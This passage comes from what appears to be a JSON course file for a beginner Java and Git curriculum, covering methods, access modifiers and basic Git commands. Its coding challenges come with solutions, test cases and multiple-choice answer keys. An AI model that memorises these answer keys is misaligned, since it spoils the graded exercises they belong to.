              "content": "When to use 'void' (no return value):\n✓ Method performs an action (print, modify something)\n✓ You don't need a result back\n\npublic static void printBanner() {\n    System.out.println(\"============\");\n    System.out.println(\"WELCOME\");\n    System.out.println(\"============\");\n}\n\nWhen to return a value:\n✓ Method calculates something\n✓ You need the result for later\n\npublic static double calculateTip(double bill, double percent) {\n    return bill * (percent / 100);\n}\n\ndouble tip = calculateTip(50.0, 15);  // tip is 7.5\n\nKey difference:\n- void methods DO something\n- Returning methods CALCULATE and give you something back"
            },
            {
              "type": "WARNING",
              "title": "Common Method Mistakes",
              "content": "Avoid these frequent errors:\n\n1. RETURNING FROM VOID METHOD:\n// WRONG: void methods cannot return a value\npublic static void sayHi() {\n    return \"Hi\";  // COMPILE ERROR!\n}\n\n2. FORGETTING TO RETURN:\n// WRONG: Missing return statement\npublic static int add(int a, int b) {\n    int sum = a + b;\n    // Forgot to return sum!  COMPILE ERROR\n}\n\n3. WRONG RETURN TYPE:\n// WRONG: Method says int, but returns double\npublic static int divide(int a, int b) {\n    return a / (double) b;  // COMPILE ERROR!\n}\n\n4. USING VOID RETURN VALUE:\n// WRONG: void has no value to store\npublic static void printHi() { System.out.println(\"Hi\"); }\nString result = printHi();  // COMPILE ERROR!\n\n5. CONFUSING METHOD WITH CONSTRUCTOR:\n// This is a METHOD named Student (returns void)\npublic static void Student() { }\n\n// This is a CONSTRUCTOR (no return type at all)\npublic Student() { }\n\n6. ALWAYS USE @Override WHEN OVERRIDING:\n// Without @Override, typos create new methods!\n@Override\npublic String toString() { ... }  // Safe - compiler checks!"
            },
            {
              "type": "THEORY",
              "title": "Preview: Methods as Values (Method References)",
              "content": "Here's something powerful you'll explore more in the Streams module:\n\nIn Java, methods can be passed around as VALUES, not just called!\n\nTRADITIONAL: Call methods directly\nvoid printNumber(int n) {\n    println(n);\n}\nfor (int i = 1; i <= 5; i++) {\n    printNumber(i);  // Call the method\n}\n\nMODERN: Pass the method itself using ::\nList<Integer> numbers = List.of(1, 2, 3, 4, 5);\nnumbers.forEach(System.out::println);  // Pass the method!\n\nThe :: syntax creates a \"method reference\" - a way to refer to a method without calling it. The forEach then calls it for each item.\n\nThis enables a powerful style called FUNCTIONAL PROGRAMMING:\n• Pass methods to other methods\n• Transform data with map, filter, reduce\n• Write concise, expressive code\n\nDon't worry if this seems advanced - we'll cover it fully in the Streams module. For now, just know that methods in Java are more flexible than they first appear!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-5-simple",
              "title": "Create a Simple Method",
              "description": "Create a method called 'printWelcome' that prints \"Welcome!\"\n\nThe method should:\n- Return void (nothing)\n- Have no parameters\n- Print: Welcome!\n\nThen call it from main.\n\nExpected output: Welcome!",
              "instructions": "Create a method called 'printWelcome' that prints \"Welcome!\"\n\nThe method should:\n- Return void (nothing)\n- Have no parameters\n- Print: Welcome!\n\nThen call it from main.\n\nExpected output: Welcome!",
              "starterCode": "// Create a Simple Method\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Create a Simple Method\n// This demonstrates creating and calling a void method\n\nvoid main() {\n    // Call the method from main\n    printWelcome();\n}\n\n// Define a method that prints \"Welcome!\"\nvoid printWelcome() {\n    println(\"Welcome!\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-5-simple-test-1",
                  "description": "Should print Welcome!",
                  "expectedOutput": "Welcome!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-5-return",
              "title": "Method with Return Value",
              "description": "Create a method called 'doubleNumber' that:\n- Takes one int parameter called 'number'\n- Returns number * 2\n- Return type is int\n\nThe main method will call it with 5 and print the result.\n\nExpected output: 10",
              "instructions": "Create a method called 'doubleNumber' that:\n- Takes one int parameter called 'number'\n- Returns number * 2\n- Return type is int\n\nThe main method will call it with 5 and print the result.\n\nExpected output: 10",
              "starterCode": "// Method with Return Value\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Method with Return Value\n// This demonstrates methods that return values\n\nvoid main() {\n    // Call the method with 5 and print the result\n    int result = doubleNumber(5);\n    println(result);\n}\n\n// Method that takes an int and returns it doubled\n// Return type is int (not void) because we return a value\nint doubleNumber(int number) {\n    return number * 2;\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-5-return-test-1",
                  "description": "Should return 5 * 2 = 10",
                  "expectedOutput": "10",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-5-params",
              "title": "Method with Parameters",
              "description": "Create a method called 'add' that:\n- Takes two int parameters: a and b\n- Returns a + b\n- Return type is int\n\nThe main method will call it with 7 and 3.\n\nExpected output: 10",
              "instructions": "Create a method called 'add' that:\n- Takes two int parameters: a and b\n- Returns a + b\n- Return type is int\n\nThe main method will call it with 7 and 3.\n\nExpected output: 10",
              "starterCode": "// Method with Parameters\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Method with Parameters\n// This demonstrates methods with multiple parameters\n\nvoid main() {\n    // Call the add method with 7 and 3, print result\n    int result = add(7, 3);\n    println(result);\n}\n\n// Method that takes two int parameters and returns their sum\nint add(int a, int b) {\n    return a + b;\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-5-params-test-1",
                  "description": "Should return 7 + 3 = 10",
                  "expectedOutput": "10",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-1-lesson-6",
          "title": "Lesson 2.6: What Do 'public', 'static', and 'void' Mean?",
          "moduleId": "module-02",
          "order": 6,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Mystery Keywords You've Been Ignoring",
              "content": "You've been writing:\n\npublic static void main(String[] args)\npublic static int add(int a, int b)\n\nAnd I told you: \"Just write 'public static' for now.\"\n\nBut what do these keywords ACTUALLY mean?\nWhy do we write them?\nWhen do you use 'public' vs 'private'?\nWhat's the difference between 'void' and 'int'?\n\nTime to demystify these CRUCIAL keywords!"
            },
            {
              "type": "THEORY",
              "title": "Part 1: Understanding 'void' vs Return Types",
              "content": "'void' is NOT a type like 'int' or 'String'. It means \"returns NOTHING\".\n\nVOID METHOD (performs action, returns nothing):\n\npublic static void sayHello() {\n    System.out.println(\"Hello!\");\n    // NO return statement\n}\n\nsayHello();  // Just does something, doesn't give back a value\n\nRETURNING METHOD (calculates and returns value):\n\npublic static int add(int a, int b) {\n    return a + b;  // MUST return an int\n}\n\nint result = add(5, 3);  // result gets the value 8\n\nKEY DIFFERENCE:\n- void = \"do something\" (print, save, modify)\n- int/String/double/etc = \"calculate and give me back a value\"\n\nThink of it like asking someone to do something:\n- \"Clean your room!\" (void - just do it, no result)\n- \"What's 2 + 2?\" (returns int - I need an answer back)"
            },
            {
              "type": "THEORY",
              "title": "Part 2: Understanding 'public' vs 'private'",
              "content": "'public' and 'private' control WHO can access your method.\n\nPUBLIC = Everyone can use it:\n\npublic static int add(int a, int b) {\n    return a + b;\n}\n\n// Any code, anywhere can call this:\nint x = MathUtils.add(5, 3);  // Works!\n\nPRIVATE = Only THIS class can use it:\n\nprivate static int secretCalculation(int x) {\n    return x * 2 + 10;  // Internal helper method\n}\n\n// Other classes CAN'T call this:\nint y = MathUtils.secretCalculation(5);  // COMPILE ERROR!\n\nWHY USE PRIVATE?\n- Hide internal implementation details\n- Prevent others from depending on internal code\n- Make it easier to change later\n\nRULE OF THUMB:\n- Methods you want others to use: public\n- Helper methods just for your class: private"
            },
            {
              "type": "KEY_POINT",
              "title": "public vs private: Restaurant Kitchen Analogy",
              "content": "Imagine a restaurant:\n\nPUBLIC methods = Menu items (customer-facing):\n- orderPizza() ✓ Customer can call this\n- orderSalad() ✓ Customer can call this\nThese are the INTERFACE the public uses.\n\nPRIVATE methods = Kitchen processes (internal):\n- chopVegetables() ✗ Customer can't call this\n- preheartOven() ✗ Customer can't call this\nThese are IMPLEMENTATION details customers shouldn't worry about.\n\nIn code:\n\npublic class Restaurant {\n    // PUBLIC - customers can call\n    public void orderPizza(String type) {\n        prepareOven();        // Call private helper\n        makeDough();          // Call private helper\n        addToppings(type);    // Call private helper\n    }\n    \n    // PRIVATE - internal methods\n    private void prepareOven() { ... }\n    private void makeDough() { ... }\n    private void addToppings(String type) { ... }\n}"
            },
            {
              "type": "THEORY",
              "title": "Part 3: Understanding 'static'",
              "content": "'static' means the method belongs to the CLASS, not to individual objects.\n\nSTATIC METHOD (class-level, no object needed):\n\npublic static int add(int a, int b) {\n    return a + b;\n}\n\n// Call directly on class:\nint result = MathUtils.add(5, 3);  // No object needed!\n\nNON-STATIC METHOD (instance-level, needs an object):\n\npublic class Dog {\n    String name;\n    \n    public void bark() {  // NO 'static'\n        System.out.println(name + \" says Woof!\");\n    }\n}\n\n// Must create object first:\nDog myDog = new Dog();\nmyDog.name = \"Buddy\";\nmyDog.bark();  // \"Buddy says Woof!\"\n\nWHEN TO USE STATIC:\n✓ Utility methods (Math.sqrt, Integer.parseInt)\n✓ Methods that don't need object data\n✓ main() method (entry point)\n\nWHEN TO USE NON-STATIC:\n✓ Methods that work with object data\n✓ Behavior specific to an instance\n✓ Most methods in classes you create"
            },
            {
              "type": "KEY_POINT",
              "title": "static: Shared vs Personal",
              "content": "STATIC = Shared tool (belongs to everyone):\n\nThink of a PUBLIC calculator at school:\n- Anyone can use it\n- Doesn't belong to any one student\n- Same calculator for all\n\nMath.abs(-5)  // Use the shared Math class\n\nNON-STATIC = Personal item (belongs to an instance):\n\nThink of YOUR phone:\n- Has YOUR contacts\n- Stores YOUR photos\n- Different from others' phones\n\nmyPhone.makeCall(\"Mom\")  // Your phone, your mom's number\n\nIn Java:\n\n// STATIC - shared, no object needed\npublic static int add(int a, int b) {\n    return a + b;  // Same for everyone\n}\nCalculator.add(2, 3);  // Just call it\n\n// NON-STATIC - instance-specific\npublic class BankAccount {\n    double balance;  // EACH account has its own balance\n    \n    public void deposit(double amount) {\n        balance += amount;  // Modifies THIS account\n    }\n}\nBankAccount aliceAccount = new BankAccount();\naliceAccount.deposit(100);  // Alice's balance changes"
            },
            {
              "type": "KEY_POINT",
              "title": "Putting It All Together",
              "content": "public static void main(String[] args)\n  |      |     |    |     └─ Parameter: array of Strings\n  |      |     |    └─ Name: main (special name, program entry)\n  |      |     └─ Return type: void (doesn't return anything)\n  |      └─ static: Can be called without creating an object\n  └─ public: Must be accessible from anywhere (JVM needs to call it)\n\npublic static int add(int a, int b)\n  |      |     |   |   └─ Parameters\n  |      |     |   └─ Name\n  |      |     └─ Return type: int (returns an integer)\n  |      └─ static: Utility method, no object needed\n  └─ public: Other classes can use this\n\nprivate void updateDisplay()\n  |      |    └─ Name\n  |      └─ Return type: void (performs action, no return)\n  └─ private: Only THIS class can call this\n\nQUICK REFERENCE:\n- void: Returns nothing\n- int/String/etc: Returns that type\n- public: Everyone can access\n- private: Only this class can access\n- static: Class-level, no object needed\n- (no static): Instance-level, needs object"
            },
            {
              "type": "WARNING",
              "title": "Common Access Modifier Mistakes",
              "content": "Avoid these frequent errors:\n\n1. MAKING EVERYTHING PUBLIC:\n// BAD: Exposes internal implementation\npublic class User {\n    public String password;  // Anyone can read/modify!\n}\n\n// GOOD: Use private with getters\nprivate String password;\npublic boolean checkPassword(String input) { ... }\n\n2. CALLING NON-STATIC FROM STATIC:\n// WRONG: Cannot access instance field from static method\npublic class Example {\n    String name;\n    public static void main(String[] args) {\n        System.out.println(name);  // COMPILE ERROR!\n    }\n}\n\n3. FORGETTING main() MUST BE public static:\n// WRONG: JVM cannot find entry point\nprivate static void main(String[] args) { }  // ERROR\nstatic void main(String[] args) { }  // Package-private, fails\n\n4. ACCESSING PRIVATE FROM ANOTHER CLASS:\n// In class A:\nprivate void helper() { }\n\n// In class B:\nA obj = new A();\nobj.helper();  // COMPILE ERROR: helper has private access\n\n5. USING DEFAULT (PACKAGE-PRIVATE) ACCIDENTALLY:\n// No modifier = package-private, NOT public!\nvoid myMethod() { }  // Only accessible within same package\npublic void myMethod() { }  // Accessible everywhere"
            },
            {
              "type": "THEORY",
              "title": "Why Modern Java Hides public static void main",
              "content": "You've been writing simple programs with just:\n\nvoid main() {\n    println(\"Hello!\");\n}\n\nBut the traditional Java entry point is:\n\npublic static void main(String[] args) {\n    System.out.println(\"Hello!\");\n}\n\nWhy does modern Java (21+) hide these keywords?\n\nFor beginners, the traditional syntax creates UNNECESSARY complexity:\n• public - Who else would call main? The JVM needs it, period.\n• static - Required because there's no object yet. Confusing for beginners!\n• void - main doesn't return anything useful to the JVM.\n• String[] args - Command-line args you rarely use while learning.\n• System.out - Why not just println()?\n\nModern Java's \"implicit main\" lets you focus on WHAT the code does, not ceremony.\n\nTRADITIONAL (all the ceremony):\npublic class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello!\");\n    }\n}\n\nMODERN (just the logic):\nvoid main() {\n    println(\"Hello!\");\n}\n\nBehind the scenes, Java still creates the class and static main - it just does it FOR you. When you're ready for larger programs with multiple classes, you'll use the full syntax."
            },
            {
              "type": "KEY_POINT",
              "title": "When You'll Need the Full Syntax",
              "content": "The simplified void main() works for:\n✓ Learning and experimenting\n✓ Small single-file programs\n✓ Quick scripts and prototypes\n\nYou'll need public static void main when:\n• Building larger applications with multiple classes\n• Creating reusable libraries\n• Working with frameworks (Spring, etc.)\n• Deploying to production environments\n\nThe transition is easy:\n\n// Simple (learning)\nvoid main() {\n    greet(\"World\");\n}\n\nvoid greet(String name) {\n    println(\"Hello, \" + name + \"!\");\n}\n\n// Full (production)\npublic class Greeter {\n    public static void main(String[] args) {\n        greet(\"World\");\n    }\n    \n    public static void greet(String name) {\n        System.out.println(\"Hello, \" + name + \"!\");\n    }\n}\n\nNow that you understand WHAT public, static, and void mean, you'll recognize them when you see them - and know when to use them!"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-2-6-access",
              "title": "Understanding public static void",
              "description": "In 'public static void main(String[] args)', what does 'static' mean?",
              "options": [
                "The method cannot be changed",
                "The method belongs to the class, not an object",
                "The method runs automatically",
                "The method is required"
              ],
              "correctAnswer": 1,
              "explanation": "Static means the method belongs to the class itself, so it can be called without creating an object first. That's why main() can run before any objects exist."
            }
          ]
        }
      ],
      "order": 2
    },
    {
      "id": "module-git",
      "title": "Git & Development Workflow",
      "description": "Master version control with Git and collaborative development with GitHub. Learn to track changes, work with branches, and collaborate effectively on code projects.",
      "difficulty": "beginner",
      "estimatedHours": 2.5,
      "lessons": [
        {
          "id": "git-lesson-1",
          "title": "Lesson 3.1: Why Version Control?",
          "moduleId": "module-git",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Code Without History",
              "content": "Imagine you're working on a Java project. You've spent hours building a feature, and it works perfectly. Then you decide to 'improve' it:\n\n1. You delete some code that seems unnecessary\n2. You refactor a method to be 'cleaner'\n3. You realize your changes broke everything\n4. You frantically try to remember what you deleted\n5. You can't. Hours of work - gone.\n\nOr imagine this scenario:\n- Monday: Your code works perfectly\n- Tuesday: You add a new feature\n- Wednesday: You find a bug - but where did it come from?\n- You have no way to see what changed between Monday and Wednesday\n\nWithout version control, you're:\n❌ Working without a safety net\n❌ Unable to track when bugs were introduced\n❌ Risking losing hours or days of work\n❌ Unable to collaborate effectively with others\n❌ Creating chaos with files like 'project_final_v2_REAL_final.zip'\n\nThis is why every professional developer uses version control."
            },
            {
              "type": "KEY_POINT",
              "title": "Git: The Time Machine for Code",
              "content": "Git is a VERSION CONTROL SYSTEM - software that tracks changes to your code over time.\n\nThink of Git as a time machine for your project:\n\n✓ SAVE CHECKPOINTS: At any point, you can save a 'snapshot' of your entire project\n✓ TIME TRAVEL: You can go back to any previous snapshot instantly\n✓ SEE WHAT CHANGED: Compare any two points in time to see exactly what was modified\n✓ PARALLEL UNIVERSES: Work on experimental features without affecting your main code\n✓ COLLABORATION: Multiple developers can work on the same project without chaos\n\nGit was created by Linus Torvalds (the creator of Linux) in 2005. Today, it's used by:\n- 100+ million developers worldwide\n- Every major tech company (Google, Microsoft, Amazon, Netflix...)\n- Open source projects of all sizes\n- Solo developers managing personal projects\n\nIn 2025, knowing Git is not optional - it's expected. According to industry surveys, over 95% of developers use Git daily."
            },
            {
              "type": "THEORY",
              "title": "Mental Model: Snapshots, Not Changes",
              "content": "Unlike some older version control systems, Git thinks in SNAPSHOTS, not changes.\n\nImagine photographing your desk every hour:\n- 9 AM: Photo shows laptop, coffee, notebook\n- 10 AM: Photo shows laptop, coffee (notebook moved)\n- 11 AM: Photo shows laptop, water, notebook (coffee replaced with water)\n\nEach photo is a complete picture of your desk at that moment. Git works the same way - each 'commit' is a complete snapshot of your entire project.\n\nKey Git concepts:\n\n1. REPOSITORY (repo): Your project folder with Git tracking enabled\n   - Contains all your code AND its complete history\n   - The '.git' folder stores all the magic\n\n2. COMMIT: A saved snapshot of your project at a point in time\n   - Has a unique ID (like a fingerprint)\n   - Includes a message describing what changed\n   - Points to its parent commit(s)\n\n3. WORKING DIRECTORY: Your current files that you're editing\n   - What you see in your file explorer\n   - Can be different from the last commit\n\n4. STAGING AREA (Index): A preparation zone for your next commit\n   - You choose which changes to include in the next snapshot\n   - Gives you control over what gets saved"
            },
            {
              "type": "KEY_POINT",
              "title": "The Git Workflow: Edit, Stage, Commit",
              "content": "The basic Git workflow has three steps:\n\n1. EDIT: Make changes to your files (write code!)\n   └─> Changes exist only in your working directory\n\n2. STAGE: Choose which changes to include in your next snapshot\n   └─> git add <file> moves changes to the staging area\n\n3. COMMIT: Save the staged changes as a permanent snapshot\n   └─> git commit -m 'description' creates the snapshot\n\nThink of it like packing for a trip:\n1. You gather items from around your house (EDITING)\n2. You put selected items in your suitcase (STAGING)\n3. You close and lock the suitcase (COMMITTING)\n\nYou can open the suitcase later (go back to that commit) and find exactly what you packed!"
            },
            {
              "type": "EXAMPLE",
              "title": "A Day in the Life with Git",
              "content": "Here's how a typical development session looks with Git:\n\nMorning:\n- You open your Java project\n- You check the current status: git status\n- You see no uncommitted changes - starting fresh!\n\nCoding Session:\n- You write a new method for validating user input\n- You test it - it works!\n- You stage your changes: git add UserValidator.java\n- You commit: git commit -m 'Add input validation for email field'\n\nAfternoon:\n- You realize the validation has a bug with edge cases\n- You compare with yesterday's version: git diff HEAD~1\n- You see exactly what you changed\n- You fix the bug and commit again\n\nEnd of Day:\n- You push your changes to GitHub: git push\n- Your code is safely backed up in the cloud\n- Your teammates can see your work tomorrow\n\nThis workflow becomes second nature - you'll commit dozens of times per day!",
              "code": "// Example: Your first day using Git\n\n// Terminal commands (you'll learn these in the next lesson)\n$ git init                              // Start tracking this project\n$ git status                            // See what's changed\n$ git add UserValidator.java            // Stage the file\n$ git commit -m 'Add email validation'  // Save the snapshot\n$ git log                               // See your history\n$ git push origin main                  // Upload to GitHub",
              "language": "bash"
            },
            {
              "type": "KEY_POINT",
              "title": "Git vs GitHub: What's the Difference?",
              "content": "Many beginners confuse Git and GitHub. They're related but different:\n\nGIT:\n- Software that runs on your computer\n- Tracks changes locally on your machine\n- Works completely offline\n- Free and open source\n- Created in 2005 by Linus Torvalds\n\nGITHUB:\n- A website/cloud service (github.com)\n- Hosts Git repositories online\n- Enables collaboration with other developers\n- Adds features: issues, pull requests, code review\n- Owned by Microsoft since 2018\n\nAnalogy:\nGit = The engine of a car (does the actual work)\nGitHub = A parking garage (a place to store your car and meet others)\n\nYou can use Git without GitHub (local-only version control).\nYou cannot use GitHub without Git (GitHub stores Git repositories).\n\nOther Git hosting services exist: GitLab, Bitbucket, Azure DevOps.\nThey all use Git - they're just different 'parking garages'."
            },
            {
              "type": "WARNING",
              "title": "Common Beginner Mistakes to Avoid",
              "content": "MISTAKES YOU'LL WANT TO AVOID:\n\n1. NOT COMMITTING OFTEN ENOUGH:\n   Bad: One giant commit with 500 lines of changes\n   Good: Multiple small commits, each with one logical change\n   \n2. VAGUE COMMIT MESSAGES:\n   Bad: 'fixed stuff', 'updates', 'asdfgh'\n   Good: 'Fix null pointer exception in login validation'\n   \n3. COMMITTING SENSITIVE DATA:\n   Never commit: passwords, API keys, personal data\n   Use .gitignore to exclude sensitive files\n   \n4. IGNORING .gitignore:\n   Don't commit: compiled files (.class), IDE settings, node_modules\n   Always set up .gitignore for your project type\n   \n5. FEAR OF COMMITTING:\n   Git is forgiving - you can almost always undo mistakes\n   Commit early, commit often, push regularly\n\nRemember: The goal of version control is to give you confidence to experiment. If something breaks, you can always go back!"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-1-mc-1",
              "title": "Understanding Version Control",
              "description": "What is the primary purpose of version control?",
              "question": "What is the PRIMARY purpose of version control?",
              "options": [
                "To make your code run faster",
                "To track changes over time and enable collaboration",
                "To compress your files and save disk space",
                "To automatically fix bugs in your code"
              ],
              "correctAnswer": 1,
              "explanation": "Version control systems like Git track changes to your code over time, allowing you to see history, revert to previous versions, and collaborate with others. They don't affect runtime performance, compression, or bug fixing.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-1-mc-2",
              "title": "Git vs GitHub",
              "description": "Understanding the difference between Git and GitHub",
              "question": "What is the relationship between Git and GitHub?",
              "options": [
                "Git and GitHub are the same thing",
                "GitHub is a newer version of Git",
                "Git is version control software; GitHub is a cloud service that hosts Git repositories",
                "GitHub is required to use Git"
              ],
              "correctAnswer": 2,
              "explanation": "Git is the version control software that runs locally on your computer. GitHub is a cloud-based service that hosts Git repositories online and adds collaboration features. You can use Git without GitHub, but GitHub requires Git.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-1-mc-3",
              "title": "The Git Workflow",
              "description": "Understanding the basic Git workflow",
              "question": "What is the correct order of the basic Git workflow?",
              "options": [
                "Commit, Stage, Edit",
                "Stage, Commit, Edit",
                "Edit, Stage, Commit",
                "Edit, Commit, Stage"
              ],
              "correctAnswer": 2,
              "explanation": "The correct workflow is: 1) Edit your files, 2) Stage the changes you want to save (git add), 3) Commit the staged changes as a snapshot (git commit). This gives you control over exactly what goes into each commit.",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "git-lesson-2",
          "title": "Lesson 3.2: Git Basics",
          "moduleId": "module-git",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Setting Up Git",
              "content": "Before using Git, you need to install it and configure your identity.\n\n1. INSTALLING GIT:\n\nWindows:\n- Download from git-scm.com\n- Run the installer (accept defaults)\n- Use 'Git Bash' terminal or Windows Terminal\n\nmacOS:\n- Open Terminal and type: git --version\n- If not installed, it will prompt you to install Xcode Command Line Tools\n- Or use Homebrew: brew install git\n\nLinux (Ubuntu/Debian):\n- sudo apt update && sudo apt install git\n\n2. CONFIGURING YOUR IDENTITY:\n\nGit needs to know who you are (for commit authorship):\n\n$ git config --global user.name 'Your Name'\n$ git config --global user.email 'your.email@example.com'\n\nThe --global flag sets this for all repositories on your computer.\n\n3. VERIFY INSTALLATION:\n\n$ git --version\n  git version 2.43.0  (or similar)\n\n$ git config --list\n  user.name=Your Name\n  user.email=your.email@example.com\n\nYou only need to do this setup once per computer!"
            },
            {
              "type": "KEY_POINT",
              "title": "Essential Git Commands: init and status",
              "content": "GIT INIT - Create a New Repository\n\nTo start tracking a project with Git:\n\n$ cd my-java-project      # Navigate to your project folder\n$ git init                 # Initialize Git tracking\n  Initialized empty Git repository in /path/to/my-java-project/.git/\n\nThis creates a hidden '.git' folder that stores all version history.\n\nNOTE: Only run 'git init' once per project, at the project root!\n\n\nGIT STATUS - Check Current State\n\nThis is the command you'll use most often:\n\n$ git status\n\nPossible outputs:\n\n1. Clean state (nothing to commit):\n   On branch main\n   nothing to commit, working tree clean\n\n2. Untracked files (new files Git doesn't know about):\n   Untracked files:\n     HelloWorld.java\n\n3. Modified files (existing files you've changed):\n   Changes not staged for commit:\n     modified: HelloWorld.java\n\n4. Staged files (ready to commit):\n   Changes to be committed:\n     new file: HelloWorld.java\n\nRun 'git status' frequently - it tells you exactly what's happening!"
            },
            {
              "type": "THEORY",
              "title": "git add - Staging Changes",
              "content": "The 'git add' command moves changes from your working directory to the staging area.\n\nThink of staging as choosing which photos to put in an album:\n- You have 20 photos (all your changed files)\n- You select 5 for this album (stage specific files)\n- You create the album (commit those 5)\n\nCOMMANDS:\n\n1. Stage a specific file:\n   $ git add HelloWorld.java\n\n2. Stage multiple specific files:\n   $ git add HelloWorld.java UserService.java\n\n3. Stage all files in current directory:\n   $ git add .\n\n4. Stage all changes in the entire repository:\n   $ git add -A\n   or\n   $ git add --all\n\n5. Stage parts of a file interactively:\n   $ git add -p HelloWorld.java\n\nBEST PRACTICES:\n- Don't blindly 'git add .' - review what you're staging\n- Stage related changes together\n- Keep commits focused on one logical change"
            },
            {
              "type": "KEY_POINT",
              "title": "git commit - Saving Snapshots",
              "content": "The 'git commit' command creates a permanent snapshot of your staged changes.\n\nBASIC SYNTAX:\n$ git commit -m 'Your commit message here'\n\nEXAMPLE:\n$ git add HelloWorld.java\n$ git commit -m 'Add greeting method to HelloWorld class'\n  [main abc1234] Add greeting method to HelloWorld class\n   1 file changed, 5 insertions(+)\n\n\nWRITING GOOD COMMIT MESSAGES:\n\nA good commit message is like a good news headline:\n- Summarizes WHAT changed and WHY\n- Uses imperative mood ('Add feature' not 'Added feature')\n- Is specific and meaningful\n\nGOOD MESSAGES:\n✓ 'Fix null pointer exception in user login'\n✓ 'Add email validation to registration form'\n✓ 'Refactor database connection to use connection pool'\n✓ 'Update README with installation instructions'\n\nBAD MESSAGES:\n✗ 'fix' (too vague)\n✗ 'Updated stuff' (what stuff?)\n✗ 'WIP' (work in progress - not ready to commit)\n✗ 'asdfasdf' (meaningless)\n\n\nCONVENTIONAL COMMITS (Industry Standard):\nMany teams use prefixes:\n- feat: Add user authentication\n- fix: Resolve memory leak in image processing\n- docs: Update API documentation\n- refactor: Simplify validation logic\n- test: Add unit tests for UserService"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete Workflow: init, add, commit",
              "content": "Let's walk through a complete example of creating a new Java project and making your first commits.",
              "code": "# Step 1: Create project directory\n$ mkdir JavaCalculator\n$ cd JavaCalculator\n\n# Step 2: Initialize Git repository\n$ git init\nInitialized empty Git repository in /home/user/JavaCalculator/.git/\n\n# Step 3: Create your first Java file\n$ echo 'public class Calculator {\n    public int add(int a, int b) {\n        return a + b;\n    }\n}' > Calculator.java\n\n# Step 4: Check status - file is untracked\n$ git status\nUntracked files:\n  Calculator.java\n\n# Step 5: Stage the file\n$ git add Calculator.java\n\n# Step 6: Check status again - file is staged\n$ git status\nChanges to be committed:\n  new file: Calculator.java\n\n# Step 7: Commit with a message\n$ git commit -m 'feat: Add Calculator class with add method'\n[main (root-commit) a1b2c3d] feat: Add Calculator class with add method\n 1 file changed, 5 insertions(+)\n create mode 100644 Calculator.java\n\n# Step 8: Verify the commit\n$ git log --oneline\na1b2c3d (HEAD -> main) feat: Add Calculator class with add method",
              "language": "bash"
            },
            {
              "type": "THEORY",
              "title": "git log - Viewing History",
